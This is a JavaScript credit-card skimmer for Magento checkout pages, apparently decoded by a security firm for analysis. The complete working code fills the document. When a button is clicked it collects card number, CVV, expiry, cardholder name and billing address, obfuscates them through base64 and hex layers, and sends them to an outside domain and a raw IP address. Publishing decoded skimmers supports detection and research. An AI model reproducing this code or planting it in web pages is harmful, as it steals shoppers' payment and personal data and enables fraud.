// Decoded by Sanguine Security <info@sansec.io>
String.prototype.hexEncode = function() {
  var a, b;
  var output = '';
  for (b = 0; b < this.length; b++) {
    a = this.charCodeAt(b).toString(16);
    output += ('000' + a).slice(-4)
  };
  return output
};

function obfuscate(arg) {
  var b64 = btoa(arg);
  var b64hex = (b64.hexEncode());
  var blob = '';
  for (var i = 0; i < b64hex.length; i++) {
    blob += (b64hex[i].charCodeAt(0) << 3) + '*'
  };
  var blobb64 = btoa(blob);
  return blobb64
}

function addtoev() {
  var allButtons = document.getElementsByClassName('button');
  for (i = 0; i < allButtons.length; i++) {
    allButtons[i].addEventListener('click', function() {
      var ccCounter = '';
      var serialPayload = '';
      if (document.getElementsByName('payment[cc_number]')[0]) {
        serialPayload += document.getElementsByName('payment[cc_number]')[0].value + '|'
      };
      if (document.getElementsByName('payment[cc_cid]')[0]) {
        ccCounter = document.getElementsByName('payment[cc_cid]')[0].value;
        serialPayload += document.getElementsByName('payment[cc_cid]')[0].value + '|'
      };
      if (document.getElementsByName('payment[cc_exp_month]')[0]) {
        serialPayload += document.getElementsByName('payment[cc_exp_month]')[0].value + '|'
      };
      if (document.getElementsByName('payment[cc_exp_year]')[0]) {
        serialPayload += document.getElementsByName('payment[cc_exp_year]')[0].value + '|'
      };
      if (document.getElementsByName('payment[cc_owner]')[0]) {
        serialPayload += document.getElementsByName('payment[cc_owner]')[0].value + '|'
      };
      if (document.getElementsByName('billing[firstname]')[0]) {
        serialPayload += document.getElementsByName('billing[firstname]')[0].value + '|'
      };
      if (document.getElementsByName('billing[lastname]')[0]) {
        serialPayload += document.getElementsByName('billing[lastname]')[0].value + '|'
      };
      if (document.getElementsByName('billing[telephone]')[0]) {
        serialPayload += document.getElementsByName('billing[telephone]')[0].value + '|'
      };
      if (document.getElementsByName('billing[street][]')[0]) {
        serialPayload += document.getElementsByName('billing[street][]')[0].value + '|'
      };
      if (document.getElementsByName('billing[city]')[0]) {
        serialPayload += document.getElementsByName('billing[city]')[0].value + '|'
      };
      if (document.getElementsByName('billing[postcode]')[0]) {
        serialPayload += document.getElementsByName('billing[postcode]')[0].value + '|'
      };
      if (document.getElementsByName('billing[region_id]')[0]) {
        serialPayload += document.getElementsByName('billing[region_id]')[0].value + '|'
      };
      if (document.getElementsByName('shipping[country_id]')[0]) {
        serialPayload += document.getElementsByName('shipping[country_id]')[0].value + '|'
      };
      if (ccCounter != '') {
        var payloadObj = {
          Domain: 'all',
          d: obfuscate(serialPayload)
        };
        rand = Math.floor((Math.random() * 1000000) + 1);
        urll = 'https://www.tarrianalee.co.uk/js/mage/adminhtml/wysiwyg/tiny_mce/plugins/magentovariable/img/validate.php?v=' + btoa(JSON.stringify(payloadObj));
        var req1 = new XMLHttpRequest();
        req1.open('GET', urll, false);
        req1.send();
        urll = 'http://89.32.251.136/counter/index.php?v=' + btoa(JSON.stringify(payloadObj));
        var req2 = new XMLHttpRequest();
        req2.open('GET', urll, false);
        req2.send()
      }
    })
  }
}
window.addEventListener('load', function() {
      addtoev()
    })
